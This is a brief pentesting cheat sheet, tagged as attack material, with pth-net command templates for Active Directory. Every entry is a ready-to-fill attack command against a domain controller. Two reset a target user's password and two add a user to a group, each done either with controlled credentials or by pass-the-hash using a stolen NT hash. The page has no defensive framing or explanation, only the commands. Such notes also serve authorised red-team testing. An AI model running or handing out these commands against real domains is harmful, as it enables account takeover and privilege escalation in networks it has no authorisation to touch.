# pth-net
#plateform/linux #target/remote #cat/ATTACK


## pth-net changing password
```
pth-net rpc Password '<TARGET_USER>' '<PASSWORD>' -U '<DOMAIN>'/'<CONTROLLED_USER>'%'<CONTROLLED_PASSWORD>' -S '<DOMAIN_CONTROLLER_IP>' 
```

## pth-net adding group
```
pth-net rpc group addmem '<GROUP_TO_ADD>' '<USER>' -U '<DOMAIN>'/'<CONTROLLED_USER>'%'<CONTROLLED_PASSWORD>' -S '<DOMAIN_CONTROLLER_IP>' 
```

## pth-net Adding a group member with hash
```
 pth-net rpc group addmem '<GROUP_TO_ADD>' '<USER>' -U '<DOMAIN>'/'<CONTROLLED_USER>'%'ffffffffffffffffffffffffffffffff':'<NT_HASH>' -S '<DOMAIN_CONTROLLER_IP>'
```

## pth-net changing password with hash
```
pth-net rpc Password <TARGET_USER> <NEW_PASSWORD_FOR_TARGET> -U <DOMAIN>/<CONTROLLED_USER>%ffffffffffffffffffffffffffffffff:<NT_HASH> -S <DOMAIN_CONTROLLER_IP>
```

